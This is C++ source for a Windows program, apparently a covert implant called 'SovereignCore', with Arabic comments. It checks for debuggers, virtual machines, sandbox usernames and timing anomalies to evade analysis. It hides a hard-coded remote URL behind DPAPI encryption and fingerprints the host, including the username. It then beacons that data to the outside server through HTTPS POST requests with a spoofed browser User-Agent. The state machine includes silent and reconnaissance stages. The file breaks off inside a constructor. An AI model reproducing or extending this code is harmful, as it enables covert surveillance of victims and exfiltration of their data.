#include <windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <atomic>
#include <string>
#include <vector>
#include <memory>
#include <chrono>
#include <thread>
#include <mutex>
#include <shared_mutex>
#include <condition_variable>
#include <queue>
#include <map>
#include <functional>
#include <intrin.h>
#include <random>
#include <codecvt>
#include <locale>
#include <algorithm>
#include <set>
#include <cstring>
#include <dpapi.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "rpcrt4.lib")

// تعريفات مفقودة
#ifndef FLG_HEAP_ENABLE_TAIL_CHECK
#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
#endif

#ifndef FLG_HEAP_ENABLE_FREE_CHECK
#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
#endif

// تعريف NtDelayExecution
extern "C" NTSTATUS NTAPI NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

// =====================================================================
// مكتبة Base64 مدمجة
// =====================================================================
namespace Base64 {
    static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::string encode(const std::vector<uint8_t>& data) {
        if (data.empty()) return "";

        std::string result;
        result.reserve(((data.size() + 2) / 3) * 4);

        for (size_t i = 0; i < data.size(); i += 3) {
            uint32_t octet_a = i < data.size() ? data[i] : 0;
            uint32_t octet_b = i + 1 < data.size() ? data[i + 1] : 0;
            uint32_t octet_c = i + 2 < data.size() ? data[i + 2] : 0;

            uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

            result.push_back(b64chars[(triple >> 18) & 0x3F]);
            result.push_back(b64chars[(triple >> 12) & 0x3F]);
            result.push_back(b64chars[(triple >> 6) & 0x3F]);
            result.push_back(b64chars[triple & 0x3F]);
        }

        size_t mod = data.size() % 3;
        if (mod == 1) {
            result[result.size() - 1] = '=';
            result[result.size() - 2] = '=';
        }
        else if (mod == 2) {
            result[result.size() - 1] = '=';
        }

        return result;
    }
}

// =====================================================================
// ULTIMATE HAL V5 - مع إصلاحات كاملة
// =====================================================================
class UltimateHAL {
public:
    enum Caps : uint64_t {
        CAP_SECUREBOOT = 1ULL << 0,
        CAP_VIRTUAL = 1ULL << 1,
        CAP_HVCI = 1ULL << 2,
        CAP_SANDBOX = 1ULL << 3,
        CAP_LOWRES = 1ULL << 4,
        CAP_DEBUGGER = 1ULL << 5,
        CAP_ANALYSIS = 1ULL << 6
    };

    struct SysMetrics {
        uint32_t cores;
        uint64_t ram;
        uint64_t diskSpace;
        uint64_t uptime;
        bool isLowResource;
        std::string cpuVendor;
    };

private:
    uint64_t _activeCaps = 0;
    SysMetrics _metrics = { 0 };

    bool DetectDebugger() {
        if (IsDebuggerPresent()) return true;

        PPEB peb = nullptr;
        __try {
            peb = (PPEB)__readgsqword(0x60);
            if (!peb) return false;
            if (peb->BeingDebugged) return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        // إصلاح: استخدام CheckRemoteDebuggerPresent بدلاً من قراءة PEB مباشرة
        BOOL isDebugged = FALSE;
        if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged) && isDebugged) {
            return true;
        }

        return false;
    }

    bool DetectTimingAnomaly() {
        const int MEASUREMENTS = 5;
        std::vector<double> measurements;

        LARGE_INTEGER freq;
        if (!QueryPerformanceFrequency(&freq) || freq.QuadPart == 0) return false;

        for (int i = 0; i < MEASUREMENTS; i++) {
            LARGE_INTEGER start, end;
            QueryPerformanceCounter(&start);

            LARGE_INTEGER delay;
            delay.QuadPart = -100000; // 10ms
            NtDelayExecution(FALSE, &delay);

            QueryPerformanceCounter(&end);

            double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000.0;
            measurements.push_back(elapsed);

            if (i < MEASUREMENTS - 1) {
                delay.QuadPart = -50000; // 5ms
                NtDelayExecution(FALSE, &delay);
            }
        }

        std::sort(measurements.begin(), measurements.end());
        double median = measurements[MEASUREMENTS / 2];

        return (median < 80.0 || median > 120.0);
    }

public:
    UltimateHAL() {
        SYSTEM_INFO si; GetSystemInfo(&si);
        _metrics.cores = si.dwNumberOfProcessors;

        int cpuInfo[4] = { 0 };
        __cpuid(cpuInfo, 0);
        char vendor[13] = { 0 };
        memcpy(vendor, &cpuInfo[1], 4);
        memcpy(vendor + 4, &cpuInfo[3], 4);
        memcpy(vendor + 8, &cpuInfo[2], 4);
        _metrics.cpuVendor = vendor;

        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        _metrics.ram = ms.ullTotalPhys;

        ULARGE_INTEGER freeBytes, total, free;
        if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &total, &free)) {
            _metrics.diskSpace = total.QuadPart;
        }

        _metrics.uptime = GetTickCount64() / 1000;

        _metrics.isLowResource = (_metrics.ram < 2ULL * 1024 * 1024 * 1024) ||
            (_metrics.cores < 2) ||
            (_metrics.diskSpace < 50ULL * 1024 * 1024 * 1024) ||
            (_metrics.uptime < 300);

        int cpu[4]; __cpuid(cpu, 1);
        if (cpu[2] & (1 << 31)) _activeCaps |= CAP_VIRTUAL;

        DWORD sb = 0, sz = sizeof(sb);
        if (RegGetValueA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State",
            "UEFISecureBootEnabled", RRF_RT_REG_DWORD, NULL, &sb, &sz) == ERROR_SUCCESS) {
            if (sb) _activeCaps |= CAP_SECUREBOOT;
        }

        DWORD hvci = 0; sz = sizeof(hvci);
        if (RegGetValueA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
            "HypervisorEnforcedCodeIntegrity", RRF_RT_REG_DWORD, NULL, &hvci, &sz) == ERROR_SUCCESS) {
            if (hvci) _activeCaps |= CAP_HVCI;
        }

        char username[256] = { 0 };
        DWORD usernameLen = sizeof(username) - 1;
        if (GetUserNameA(username, &usernameLen)) {
            const char* sandboxUsers[] = { "sandbox", "virus", "malware", "analysis",
                                           "maltest", "test", "user", "vm", "virtual" };
            for (const char* su : sandboxUsers) {
                if (_stricmp(username, su) == 0) {
                    _activeCaps |= CAP_SANDBOX;
                    break;
                }
            }
        }

        if (DetectDebugger()) _activeCaps |= CAP_DEBUGGER;
        if (DetectTimingAnomaly()) _activeCaps |= CAP_ANALYSIS;
        if (_metrics.isLowResource) _activeCaps |= CAP_LOWRES;
    }

    uint64_t GetCaps() const { return _activeCaps; }
    const SysMetrics& GetMetrics() const { return _metrics; }
    bool IsSandboxed() const { return _activeCaps & CAP_SANDBOX; }
    bool IsVirtual() const { return _activeCaps & CAP_VIRTUAL; }
    bool IsLowResource() const { return _activeCaps & CAP_LOWRES; }
    bool IsDebugged() const { return _activeCaps & CAP_DEBUGGER; }
    bool IsAnalyzed() const { return _activeCaps & CAP_ANALYSIS; }
};

// =====================================================================
// CRYPTO ENGINE V6 - مع إصلاحات كاملة (PBKDF2 + AAD)
// =====================================================================
class CryptoEngine {
    BCRYPT_ALG_HANDLE hAesAlg = nullptr;
    BCRYPT_ALG_HANDLE hShaAlg = nullptr;
    BCRYPT_ALG_HANDLE hRngAlg = nullptr;
    BCRYPT_ALG_HANDLE hPbkdf2Alg = nullptr;

    std::vector<uint8_t> masterKey;
    std::chrono::system_clock::time_point keyCreationTime;

    void GenerateMasterKey() {
        masterKey.resize(32);
        if (hRngAlg && BCRYPT_SUCCESS(BCryptGenRandom(hRngAlg, masterKey.data(), 32, 0))) {
            keyCreationTime = std::chrono::system_clock::now();
            std::atomic_thread_fence(std::memory_order_seq_cst);
        }
        else {
            masterKey.clear();
        }
    }

    std::vector<uint8_t> DeriveSessionKey(const std::vector<uint8_t>& context) {
        if (masterKey.empty()) return {};

        std::vector<uint8_t> sessionKey(32);

        // إصلاح: استخدام PBKDF2 الحقيقي
        BCRYPT_KEY_HANDLE hKey = nullptr;
        NTSTATUS status = BCryptGenerateSymmetricKey(hPbkdf2Alg, &hKey, nullptr, 0,
            masterKey.data(), (ULONG)masterKey.size(), 0);

        if (BCRYPT_SUCCESS(status)) {
            BCRYPT_KEY_DATA_BLOB_HEADER blobHeader;
            blobHeader.dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
            blobHeader.dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
            blobHeader.cbKeyData = 32;

            std::vector<uint8_t> keyData(sizeof(blobHeader) + 32);
            memcpy(keyData.data(), &blobHeader, sizeof(blobHeader));

            ULONG resultLen = 0;
            status = BCryptKeyDerivation(hKey, nullptr, 0, keyData.data(),
                (ULONG)keyData.size(), &resultLen, 0);

            if (BCRYPT_SUCCESS(status) && resultLen == keyData.size()) {
                memcpy(sessionKey.data(), keyData.data() + sizeof(blobHeader), 32);
            }

            BCryptDestroyKey(hKey);
        }

        return sessionKey;
    }

public:
    CryptoEngine() {
        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
            hAesAlg = nullptr;

        if (hAesAlg) {
            BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE,
                (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        }

        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hShaAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0)))
            hShaAlg = nullptr;

        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hRngAlg, BCRYPT_RNG_ALGORITHM, nullptr, 0)))
            hRngAlg = nullptr;

        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hPbkdf2Alg, BCRYPT_PBKDF2_ALGORITHM, nullptr, 0)))
            hPbkdf2Alg = nullptr;

        GenerateMasterKey();
    }

    ~CryptoEngine() {
        SecureWipe(masterKey);
        if (hAesAlg) BCryptCloseAlgorithmProvider(hAesAlg, 0);
        if (hShaAlg) BCryptCloseAlgorithmProvider(hShaAlg, 0);
        if (hRngAlg) BCryptCloseAlgorithmProvider(hRngAlg, 0);
        if (hPbkdf2Alg) BCryptCloseAlgorithmProvider(hPbkdf2Alg, 0);
    }

    static void SecureWipe(std::vector<uint8_t>& data) {
        if (data.empty()) return;
        SecureZeroMemory(data.data(), data.size());
        data.clear();
    }

    std::vector<uint8_t> GenerateRandom(size_t size) {
        std::vector<uint8_t> random(size);
        if (!hRngAlg || !BCRYPT_SUCCESS(BCryptGenRandom(hRngAlg, random.data(), (ULONG)size, 0))) {
            return {};
        }
        return random;
    }

    std::vector<uint8_t> Encrypt(const std::vector<uint8_t>& plaintext, const std::vector<uint8_t>& aad = {}) {
        if (plaintext.empty() || !hAesAlg || masterKey.empty()) return {};

        auto sessionKey = DeriveSessionKey(plaintext);
        if (sessionKey.empty()) return {};

        BCRYPT_KEY_HANDLE hKey = nullptr;

        DWORD keyObjLen = 0, res = 0;
        if (!BCRYPT_SUCCESS(BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjLen, sizeof(DWORD), &res, 0))) {
            return {};
        }

        std::vector<uint8_t> keyObj(keyObjLen);

        NTSTATUS status = BCryptGenerateSymmetricKey(hAesAlg, &hKey, keyObj.data(), keyObjLen,
            sessionKey.data(), (ULONG)sessionKey.size(), 0);
        if (!BCRYPT_SUCCESS(status)) {
            SecureWipe(keyObj);
            return {};
        }

        // إصلاح: استخدام RNG كامل بدون overwrite
        auto iv = GenerateRandom(12);
        if (iv.size() < 12) {
            BCryptDestroyKey(hKey);
            SecureWipe(keyObj);
            return {};
        }

        std::vector<uint8_t> tag(16);
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = { 0 };
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = iv.data();
        authInfo.cbNonce = (ULONG)iv.size();
        authInfo.pbTag = tag.data();
        authInfo.cbTag = (ULONG)tag.size();

        // إصلاح: إضافة AAD
        if (!aad.empty()) {
            authInfo.pbAuthData = const_cast<uint8_t*>(aad.data());
            authInfo.cbAuthData = (ULONG)aad.size();
        }

        std::vector<uint8_t> ciphertext(plaintext.size());
        ULONG resultLen = 0;

        status = BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), (ULONG)plaintext.size(),
            &authInfo, nullptr, 0, ciphertext.data(), (ULONG)ciphertext.size(),
            &resultLen, 0);

        BCryptDestroyKey(hKey);
        SecureWipe(keyObj);
        SecureWipe(sessionKey);

        if (!BCRYPT_SUCCESS(status) || resultLen == 0) {
            return {};
        }

        std::vector<uint8_t> result;
        result.insert(result.end(), iv.begin(), iv.end());
        result.insert(result.end(), tag.begin(), tag.end());
        result.insert(result.end(), ciphertext.begin(), ciphertext.begin() + resultLen);

        return result;
    }
};

// =====================================================================
// ENCRYPTED URL STORAGE V2 - مع تشفير قوي (DPAPI)
// =====================================================================
class EncryptedURL {
private:
    std::vector<uint8_t> _decrypted;

    std::string GetHWID() {
        char computerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
        if (!GetComputerNameA(computerName, &size)) {
            computerName[0] = 0;
        }

        DWORD volumeSerial = 0;
        GetVolumeInformationA("C:\\", nullptr, 0, &volumeSerial, nullptr, nullptr, nullptr, 0);

        return std::to_string(volumeSerial) + computerName;
    }

public:
    EncryptedURL() {
        std::string hwid = GetHWID();
        if (hwid.empty()) hwid = "FALLBACK_KEY_12345";

        // الرابط الأصلي: "https://nan-nnes.onrender.com"
        std::string originalUrl = "https://nan-nnes.onrender.com";

        // إصلاح: استخدام DPAPI بدلاً من XOR
        DATA_BLOB input = { (DWORD)originalUrl.length(), (BYTE*)originalUrl.data() };
        DATA_BLOB output = { 0 };

        if (CryptProtectData(&input, L"", nullptr, nullptr, nullptr, 0, &output)) {
            // إضافة HWID كـ entropy إضافي
            std::vector<uint8_t> entropy(hwid.begin(), hwid.end());

            DATA_BLOB ent = { (DWORD)entropy.size(), entropy.data() };
            DATA_BLOB finalOutput = { 0 };

            if (CryptProtectData(&output, L"", &ent, nullptr, nullptr, 0, &finalOutput)) {
                _decrypted.assign(finalOutput.pbData, finalOutput.pbData + finalOutput.cbData);
                LocalFree(finalOutput.pbData);
            }
            LocalFree(output.pbData);
        }
    }

    std::string GetURL() const {
        if (_decrypted.empty()) return "";

        // فك التشفير باستخدام DPAPI
        std::string hwid = GetHWID();
        std::vector<uint8_t> entropy(hwid.begin(), hwid.end());
        DATA_BLOB ent = { (DWORD)entropy.size(), entropy.data() };
        DATA_BLOB input = { (DWORD)_decrypted.size(), const_cast<BYTE*>(_decrypted.data()) };
        DATA_BLOB output = { 0 };

        if (CryptUnprotectData(&input, nullptr, &ent, nullptr, nullptr, 0, &output)) {
            std::string result((char*)output.pbData, output.cbData);
            LocalFree(output.pbData);
            return result;
        }

        return "";
    }

    std::string GetHost() const {
        std::string url = GetURL();
        size_t start = url.find("://");
        if (start == std::string::npos) return "";
        start += 3;

        size_t end = url.find("/", start);
        if (end == std::string::npos) end = url.length();
        return url.substr(start, end - start);
    }

    std::string GetPath() const {
        std::string url = GetURL();
        size_t start = url.find("://");
        if (start == std::string::npos) return "/";
        start += 3;

        size_t pathStart = url.find("/", start);
        if (pathStart == std::string::npos) return "/";
        return url.substr(pathStart);
    }

    void Wipe() {
        CryptoEngine::SecureWipe(_decrypted);
    }
};

// =====================================================================
// NETWORK CLIENT V6 - مع إصلاحات كاملة
// =====================================================================
class NetworkClient {
    HINTERNET hSession = nullptr;
    EncryptedURL url;

    static const size_t MAX_RESPONSE_SIZE = 1024 * 1024;
    static const int MAX_RETRIES = 3;

    // إصلاح: RAII wrapper لـ WinHTTP handles
    struct WinHttpHandle {
        HINTERNET h = nullptr;
        ~WinHttpHandle() { if (h) WinHttpCloseHandle(h); }
        operator HINTERNET() const { return h; }
        HINTERNET* operator&() { return &h; }
    };

    // إصلاح: Callback لفحص TLS
    static void CALLBACK StatusCallback(HINTERNET hInternet, DWORD_PTR dwContext,
        DWORD dwInternetStatus, LPVOID lpvStatusInformation,
        DWORD dwStatusInformationLength) {
        if (dwInternetStatus == WINHTTP_CALLBACK_STATUS_SECURE_FAILURE) {
            // إصلاح: تخزين حالة TLS في context
            bool* tlsFailed = reinterpret_cast<bool*>(dwContext);
            if (tlsFailed) *tlsFailed = true;
        }
    }

    std::wstring StringToWide(const std::string& str) {
        if (str.empty()) return std::wstring();

        int len = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
        if (len <= 0) return std::wstring();

        std::vector<wchar_t> buffer(len);
        if (!MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, buffer.data(), len)) {
            return std::wstring();
        }

        return std::wstring(buffer.data(), len - 1);
    }

public:
    NetworkClient() {
        hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);

        if (hSession) {
            DWORD timeout = 30000;
            WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
            WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
            WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

            // إصلاح: تعيين callback لفحص TLS
            WinHttpSetStatusCallback(hSession, StatusCallback,
                WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);
        }
    }

    ~NetworkClient() {
        if (hSession) {
            WinHttpSetStatusCallback(hSession, nullptr, WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS, 0);
            WinHttpCloseHandle(hSession);
        }
        url.Wipe();
    }

    enum class SendResult {
        SUCCESS,
        FAILED,
        RETRY_LATER
    };

    SendResult SendData(const std::vector<uint8_t>& data) {
        if (!hSession || data.empty()) return SendResult::FAILED;

        std::string b64Data = Base64::encode(data);
        if (b64Data.empty()) return SendResult::FAILED;

        std::string host = url.GetHost();
        std::string path = url.GetPath();

        if (host.empty()) return SendResult::FAILED;

        std::wstring wHost = StringToWide(host);
        std::wstring wPath = StringToWide(path);

        for (int retry = 0; retry < MAX_RETRIES; retry++) {
            bool tlsFailed = false;

            WinHttpHandle hConnect;
            WinHttpHandle hRequest;

            hConnect.h = WinHttpConnect(hSession, wHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (!hConnect.h) {
                if (retry < MAX_RETRIES - 1) {
                    Sleep(1000 * (retry + 1));
                    continue;
                }
                return SendResult::RETRY_LATER;
            }

            hRequest.h = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(), nullptr,
                nullptr, nullptr, WINHTTP_FLAG_SECURE);
            if (!hRequest.h) {
                if (retry < MAX_RETRIES - 1) {
                    Sleep(1000 * (retry + 1));
                    continue;
                }
                return SendResult::RETRY_LATER;
            }

            // إصلاح: تمرير context للـ callback
            WinHttpSetOption(hRequest, WINHTTP_OPTION_CONTEXT_VALUE, &tlsFailed, sizeof(tlsFailed));

            std::string jsonData;
            jsonData.reserve(b64Data.size() + 32);
            jsonData = "{\"content\":\"" + b64Data + "\"}";

            LPCWSTR headers = L"Content-Type: application/json\r\n";

            bool ok = WinHttpSendRequest(hRequest, headers, -1L,
                (LPVOID)jsonData.c_str(), (DWORD)jsonData.length(),
                (DWORD)jsonData.length(), 0);

            if (ok) {
                ok = WinHttpReceiveResponse(hRequest, nullptr);
                if (ok && !tlsFailed) {
                    DWORD statusCode = 0;
                    DWORD statusSize = sizeof(statusCode);

                    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        nullptr, &statusCode, &statusSize, nullptr)) {
                        if (statusCode == 200) return SendResult::SUCCESS;
                        if (statusCode >= 500) return SendResult::RETRY_LATER;
                    }
                }
            }

            if (tlsFailed) return SendResult::FAILED;

            if (retry < MAX_RETRIES - 1) {
                Sleep(1000 * (retry + 1));
            }
        }

        return SendResult::FAILED;
    }
};

// =====================================================================
// STATE MACHINE V7 - مع إزالة ANY المكرر
// =====================================================================
template<typename S, typename E>
class StateMachine {
public:
    using StateType = S;
    using EventType = E;

    struct Transition {
        S from;
        E event;
        S to;
        std::function<bool()> guard;
        std::function<void()> action;
    };

private:
    std::atomic<S> _state;
    std::vector<Transition> _transitions;
    mutable std::shared_mutex _mtx;

    bool ValidateTransition(const Transition& t, S current, E event) const {
        // إصلاح: الاعتماد على ANY من enum فقط
        return (t.from == static_cast<S>(-1) || t.from == current) && t.event == event;
    }

public:
    explicit StateMachine(S initialState) : _state(initialState) {}

    void AddTransition(S from, E event, S to,
        std::function<bool()> guard = nullptr,
        std::function<void()> action = nullptr) {
        std::unique_lock<std::shared_mutex> lock(_mtx);
        _transitions.push_back({ from, event, to, std::move(guard), std::move(action) });
    }

    bool Fire(E event) {
        std::shared_lock<std::shared_mutex> lock(_mtx);
        S current = _state.load();

        for (const auto& trans : _transitions) {
            if (ValidateTransition(trans, current, event)) {
                if (!trans.guard || trans.guard()) {
                    lock.unlock();
                    std::unique_lock<std::shared_mutex> wlock(_mtx);
                    _state = trans.to;
                    if (trans.action) trans.action();
                    return true;
                }
            }
        }
        return false;
    }

    S GetState() const { return _state.load(); }
    bool IsInState(S state) const { return _state.load() == state; }
};

// =====================================================================
// RECOVERY DAG V6 - مع إصلاحات كاملة
// =====================================================================
class RecoveryDAG {
    struct Node {
        std::string name;
        std::vector<std::string> deps;
        std::function<bool()> recover;
    };

    std::map<std::string, Node> _nodes;

    bool RecoverDFS(const std::string& name, std::set<std::string>& visited,
        std::set<std::string>& recursionStack) {
        if (recursionStack.count(name)) {
            return false;
        }

        if (visited.count(name)) return true;

        visited.insert(name);
        recursionStack.insert(name);

        auto it = _nodes.find(name);
        if (it == _nodes.end()) {
            recursionStack.erase(name);
            return false;
        }

        // إصلاح: التحقق من وجود dependencies
        for (const auto& dep : it->second.deps) {
            if (!_nodes.count(dep)) {
                recursionStack.erase(name);
                return false;
            }
            if (!RecoverDFS(dep, visited, recursionStack)) {
                recursionStack.erase(name);
                return false;
            }
        }

        bool result = false;
        if (it->second.recover) {
            try {
                result = it->second.recover();
            }
            catch (...) {
                result = false;
            }
        }
        else {
            result = true;
        }

        recursionStack.erase(name);
        return result;
    }

public:
    void Register(const std::string& name,
        const std::vector<std::string>& deps,
        std::function<bool()> recover) {
        _nodes[name] = { name, deps, std::move(recover) };
    }

    bool Recover(const std::string& name) {
        std::set<std::string> visited;
        std::set<std::string> recursionStack;
        return RecoverDFS(name, visited, recursionStack);
    }
};

// =====================================================================
// ADAPTIVE SCHEDULER V7 - مع إصلاحات race conditions
// =====================================================================
class AdaptiveScheduler {
    enum class State {
        STOPPED,
        STARTING,
        RUNNING,
        STOPPING
    };

    std::unique_ptr<std::thread> _thread;
    std::chrono::milliseconds _pulse{ 5000 };
    std::function<void()> _task;
    std::mutex _mtx;
    std::condition_variable _cv;
    std::atomic<State> _state{ State::STOPPED };

public:
    ~AdaptiveScheduler() {
        Stop();
    }

    void SetPulse(int ms) {
        _pulse = std::chrono::milliseconds(ms);
    }

    bool Start(std::function<void()> task) {
        State expected = State::STOPPED;
        if (!_state.compare_exchange_strong(expected, State::STARTING)) {
            return false;
        }

        _task = std::move(task);

        _thread = std::make_unique<std::thread>([this] {
            _state.store(State::RUNNING, std::memory_order_release);

            while (_state.load(std::memory_order_acquire) == State::RUNNING) {
                if (_task) _task();

                std::unique_lock<std::mutex> lock(_mtx);
                _cv.wait_for(lock, _pulse);
            }

            _state.store(State::STOPPED, std::memory_order_release);
            });

        return true;
    }

    void Stop() {
        State expected = State::RUNNING;
        if (_state.compare_exchange_strong(expected, State::STOPPING)) {
            _cv.notify_all();

            std::lock_guard<std::mutex> lock(_mtx);
            if (_thread) {
                if (std::this_thread::get_id() != _thread->get_id() && _thread->joinable()) {
                    _thread->join();
                }
                _thread.reset();
            }

            _state.store(State::STOPPED, std::memory_order_release);
        }
    }

    bool IsRunning() const {
        return _state.load(std::memory_order_acquire) == State::RUNNING;
    }
};

// =====================================================================
// HEALTH MONITOR V4 - مع إصلاحات performance
// =====================================================================
class HealthMonitor {
    struct HealthCheck {
        std::string name;
        std::function<bool()> check;
        std::chrono::seconds interval;
        std::chrono::system_clock::time_point lastCheck;
        int failures = 0;
    };

    std::vector<HealthCheck> _checks;
    std::mutex _mtx;
    std::atomic<bool> _globalHealth{ true };

public:
    void AddCheck(const std::string& name,
        std::function<bool()> check,
        std::chrono::seconds interval = std::chrono::seconds(60)) {
        std::lock_guard<std::mutex> lock(_mtx);
        _checks.push_back({ name, std::move(check), interval,
                           std::chrono::system_clock::now() - interval, 0 });
    }

    bool RunChecks() {
        auto now = std::chrono::system_clock::now();
        std::vector<HealthCheck> checksCopy;

        {
            std::lock_guard<std::mutex> lock(_mtx);
            checksCopy = _checks;
        }

        bool allHealthy = true;

        for (auto& check : checksCopy) {
            if (now - check.lastCheck >= check.interval) {
                bool result = false;
                try {
                    result = check.check();
                }
                catch (...) {
                    result = false;
                }

                check.lastCheck = now;

                if (!result) {
                    check.failures++;
                    allHealthy = false;

                    // إصلاح: تحديث الـ failures في القائمة الأصلية
                    std::lock_guard<std::mutex> lock(_mtx);
                    for (auto& original : _checks) {
                        if (original.name == check.name) {
                            original.failures = check.failures;
                            original.lastCheck = check.lastCheck;
                            break;
                        }
                    }
                }
            }
        }

        _globalHealth = allHealthy;
        return allHealthy;
    }

    bool IsHealthy() const { return _globalHealth.load(); }
};

// =====================================================================
// METRICS COLLECTOR V3
// =====================================================================
class MetricsCollector {
    struct Metrics {
        std::atomic<uint64_t> operations{ 0 };
        std::atomic<uint64_t> errors{ 0 };
        std::chrono::system_clock::time_point startTime;
    } _metrics;

public:
    MetricsCollector() {
        _metrics.startTime = std::chrono::system_clock::now();
    }

    void RecordOp() { _metrics.operations++; }
    void RecordError() { _metrics.errors++; }

    double GetSuccessRate() const {
        uint64_t total = _metrics.operations.load();
        if (total == 0) return 1.0;
        return 1.0 - (double)_metrics.errors.load() / total;
    }
};

// =====================================================================
// SOVEREIGN CORE ULTIMATE - التكامل النهائي
// =====================================================================
class SovereignCore {
    std::unique_ptr<UltimateHAL> hal;
    std::unique_ptr<CryptoEngine> crypto;
    std::unique_ptr<NetworkClient> network;
    std::unique_ptr<RecoveryDAG> dag;
    std::unique_ptr<AdaptiveScheduler> scheduler;
    std::unique_ptr<HealthMonitor> health;
    std::unique_ptr<MetricsCollector> metrics;

    enum class SystemState {
        ANY = -1,
        UNINITIALIZED = 0,
        SILENT = 1,
        RECON = 2,
        ACTIVE = 3,
        RECOVERY = 4,
        SHUTDOWN = 5
    };

    enum class SystemEvent {
        INIT = 0,
        HEARTBEAT = 1,
        ERROR = 2,
        RECOVER = 3,
        SHUTDOWN = 4
    };

    StateMachine<SystemState, SystemEvent> fsm;
    std::atomic<bool> running{ true };

    std::vector<uint8_t> systemFingerprint;

    void CollectFingerprint() {
        std::string fp;
        fp.reserve(256);

        auto& metrics = hal->GetMetrics();
        fp += "CORES:" + std::to_string(metrics.cores) + ";";
        fp += "RAM:" + std::to_string(metrics.ram) + ";";
        fp += "UPTIME:" + std::to_string(metrics.uptime) + ";";
        fp += "CAPS:" + std::to_string(hal->GetCaps()) + ";";

        char username[256];
        DWORD usernameLen = sizeof(username) - 1;
        if (GetUserNameA(username, &usernameLen)) {
            fp += "USER:" + std::string(username) + ";";
        }

        CryptoEngine::SecureWipe(systemFingerprint);
        systemFingerprint.reserve(256);
        systemFingerprint.assign(fp.begin(), fp.end());
    }

    void InitializeStateMachine() {
        fsm.AddTransition(SystemState::UNINITIALIZED, SystemEvent::INIT,
            SystemState::SILENT,
            [this] { return hal && crypto; },
            [this] { CollectFingerprint(); });

        fsm.AddTransition(SystemState::SILENT, SystemEvent::HEARTBEAT,
            SystemState::RECON,
            [this] { return health->IsHealthy(); });

        fsm.AddTransition(SystemState::RECON, SystemEvent::HEARTBEAT,
            SystemState::ACTIVE,
            [this] { return network != nullptr; });

        fsm.AddTransition(SystemState::ACTIVE, SystemEvent::ERROR,
            SystemState::RECOVERY);

        fsm.AddTransition(SystemState::RECOVERY, SystemEvent::RECOVER,
            SystemState::SILENT,
            [this] { return dag->Recover("Core"); });

        fsm.AddTransition(SystemState::ANY, SystemEvent::SHUTDOWN,
            SystemState::SHUTDOWN);
    }

    void InitializeHealthChecks() {
        health->AddCheck("Network", [this] { return network != nullptr; });
        health->AddCheck("Crypto", [this] { return crypto != nullptr; });
        health->AddCheck("Resources", [this] { return hal != nullptr; });
    }

    void InitializeRecoveryDAG() {
        dag->Register("Crypto", {}, [this] {
            crypto = std::make_unique<CryptoEngine>();
            return crypto != nullptr;
            });

        dag->Register("Network", { "Crypto" }, [this] {
            network = std::make_unique<NetworkClient>();
            return network != nullptr;
            });

        dag->Register("Core", { "Crypto", "Network" }, [this] {
            CollectFingerprint();
            return true;
            });
    }

public:
    SovereignCore() : fsm(SystemState::UNINITIALIZED) {
        hal = std::make_unique<UltimateHAL>();
        crypto = std::make_unique<CryptoEngine>();
        network = std::make_unique<NetworkClient>();
        dag = std::make_unique<RecoveryDAG>();
        scheduler = std::make_unique<AdaptiveScheduler>();
        health = std::make_unique<HealthMonitor>();
        metrics = std::make_unique<MetricsCollector>();

        if (hal->IsDebugged() || hal->IsAnalyzed()) {
            scheduler->SetPulse(60000);
        }
        else if (hal->IsLowResource()) {
            scheduler->SetPulse(15000);
        }
        else {
            scheduler->SetPulse(5000);
        }

